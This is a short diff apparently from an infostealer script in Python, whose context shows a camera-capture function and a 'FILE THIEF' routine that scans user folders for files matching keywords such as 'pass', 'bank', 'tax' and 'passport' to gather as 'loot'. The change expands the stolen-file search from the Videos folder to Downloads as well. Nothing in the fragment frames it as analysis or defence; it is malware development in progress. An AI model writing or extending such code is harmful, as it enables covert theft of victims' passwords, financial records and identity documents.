@@ -33,7 +33,7 @@ def capture_camera():
 # --- 3. THE SCOUT: FILE THIEF ---
 def scout_files():
     # Targeted search paths for sensitive details
-    paths = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Videos"]]
+    paths = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Videos","Download"]]
 
     keywords = ["pass", "bank", "secret", "tax", "passport"]
     loot_found = []
